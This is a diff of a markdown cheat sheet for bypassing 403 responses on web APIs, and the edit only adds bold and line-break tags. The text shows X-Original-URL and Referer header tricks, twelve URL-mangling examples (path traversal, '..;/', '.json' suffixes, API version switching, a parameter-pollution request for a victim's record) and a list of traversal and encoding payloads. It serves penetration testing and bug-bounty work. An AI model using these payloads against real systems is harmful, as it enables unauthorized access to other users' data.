@@ -4,15 +4,14 @@
 #### Tricks
 <b>If you want do bypass endpoint always try to use own methodology.</b>
 
-Example:
+<b>Example</b>:
 
 Http Header based bypass:
 
-1. X-Original-URL: /redact
+<b>1.</b> X-Original-URL: /redact
 
-Example:<br/>
+<b>Example:</b><br/>
  
-  
 GET /api/getUser HTTP/1.1 → 403
 Host: redact.com
 
@@ -20,7 +19,7 @@ GET / HTTP/1.1
 Host: redact.com
 X-Original-URL: /api/getUser → 200 OK
 
-2. Referer: https://site.com/api/redact
+<b>2.</b> Referer: https://site.com/api/redact
 
 Example:<br/>
   
@@ -42,66 +41,66 @@ Referer: https://site.com/api/getUser → 200 ok
 
 More examples:
 
-3. https://site.com/api/v1/users/redactid → access denied
+<b>3</b>. https://site.com/api/v1/users/redactid → access denied
 https://site.com/api/v1/users/redactid.json → bypass ok
 
-4. https://site.com/api/v1/redactid → acess denied
+<b>4</b>. https://site.com/api/v1/redactid → acess denied
 https://site.com/api/v1/users/redactid: → bypass ok
 
-5. https://site.com/api/v1/users/redactid → access denied
+<b>5</b>. https://site.com/api/v1/users/redactid → access denied
 https://site.com/api/v1/users/redactid..;/ → bypass ok
 
-6. https://site.com/api/v1/users/redactid → access denied
+<b>6</b>. https://site.com/api/v1/users/redactid → access denied
 https://site.com/api/v1/users/redactid\..\.\getUser → bypass ok
 
-7. https://site.com/api/v1/users/redactid → access denied
+<b>7</b>. https://site.com/api/v1/users/redactid → access denied
 https://site.com/api/v1/users/redactid/ → bypass ok
 
-8. https://site.com/api/v1/users/redactid → acess denied
+<b>8</b>. https://site.com/api/v1/users/redactid → acess denied
 https://site.com/api/v1/users/redactid?? → bypass ok
 
-9. https://site.com/api/v1/users/redactid → access denied
+<b>9</b>. https://site.com/api/v1/users/redactid → access denied
 https://site.com/api/v2/users/redactid → bypass ok
             or
 https://site.com/api/v3/users/redactid → bypass ok
 
-10. https://site.com/api/v1/users/redactid → access denied
+<b>10</b>. https://site.com/api/v1/users/redactid → access denied
 https://site.com/api/v1/users/redactid&accountdetails → bypass ok
 
-11. https://site.com/api/v1/users/victim?id=BAEILsaqQhk → acess denied
+<b>11</b>. https://site.com/api/v1/users/victim?id=BAEILsaqQhk → acess denied
 https://site.com/api/v1/users/your?id=UAEILsdUf50&victim?id=BAEILsaqQhk → bypass ok
 
-12. https://site.com/api/v1/users/redactid → access denied
+<b>12</b>. https://site.com/api/v1/users/redactid → access denied
 https://site.com/api/v1/users/redactid/email → bypass ok
 
 Payload for basic test:
 
-?
-??
-&
-#
-%
-%20
-%09
-/
-/..;/
-../
-..$2f
-..;/
-../
-\..\.\
-.././
-..%00/
-.%0d/
-..%5c
-..\
-..%ff/
-%2e%2e%2f
-.%2e/
-%3f
-%26
-%23
-.json
+? <br/>
+?? <br/>
+& <br/>
+# <br/>
+% <br/>
+%20 <br/>
+%09 <br/>
+/ <br/>
+/..;/ <br/>
+../ <br/>
+..$2f <br/>
+..;/ <br/>
+../ <br/>
+\..\.\ <br/>
+.././ <br/>
+..%00/ <br/>
+.%0d/ <br/>
+..%5c <br/>
+..\ <br/>
+..%ff/ <br/>
+%2e%2e%2f <br/>
+.%2e/ <br/>
+%3f <br/>
+%26 <br/>
+%23 <br/>
+.json <br/>
 
 HTTP Header based bypass:
 
